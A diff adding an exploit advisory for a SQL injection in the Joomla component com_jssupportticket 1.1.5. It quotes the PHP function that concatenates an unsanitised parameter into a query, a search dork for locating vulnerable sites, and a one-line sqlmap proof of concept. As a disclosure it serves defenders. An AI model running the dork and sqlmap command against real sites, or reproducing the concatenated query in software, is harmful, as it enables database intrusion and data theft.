@@ -1,0 +1,44 @@
+#Exploit Title: Joomla! component com_jssupportticket - SQL Injection
+#Dork: inurl:"index.php?option=com_jssupportticket"
+#Date: 08.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://www.joomsky.com/
+#Software Link: https://www.joomsky.com/46/download/1.html
+#Version: 1.1.5
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+Vulnerable code is in line 441 in file admin/models/userfields.php
+
+   439	    function dataForDepandantField( $val , $childfield){ 
+   440	        $db = $this->getDBO();
+   441	        $query = "SELECT userfieldparams,fieldtitle,field,depandant_field FROM `#__js_ticket_fieldsordering` WHERE field = '".$childfield."'"; //!!!
+   442	        $db->setQuery($query);
+   443	        $data = $db->loadObject();
+   444	        $decoded_data = json_decode($data->userfieldparams); 
+   445	        $comboOptions = array(); 
+   446	        $flag = 0; 
+   447	        foreach ($decoded_data as $key => $value) { 
+   448	            if($key == $val){ 
+   449	               for ($i=0; $i < count($value) ; $i++) {  
+   450	                if($flag == 0){
+   451	                    $comboOptions[] = array('value' => '', 'text' => JText::_('Select').' '.$data->fieldtitle); 
+   452	                }
+   453	                $comboOptions[] = array('value' => $value[$i], 'text' => $value[$i]); 
+   454	                $flag = 1; 
+   455	               } 
+   456	            } 
+   457	        }
+   458	        $jsFunction = ''; 
+   459	        if ($data->depandant_field != null) {
+   460	            $jsFunction = "onchange=getDataForDepandantField('" . $data->field . "','" . $data->depandant_field . "',1);";
+   461	        }
+   462	        $html = JHTML::_('select.genericList', $comboOptions , $childfield,'class="inputbox one"'.$jsFunction, 'value' , 'text' ,'');
+   463	        return $html; 
+   464	    }
+
+#####################################
+#PoC:
+#####################################
+$> sqlmap.py -u "http://localhost/index.php?option=com_jssupportticket&c=ticket&task=datafordepandantfield&fvalue=0&child=0" --random-agent -p child --dbms=mysql
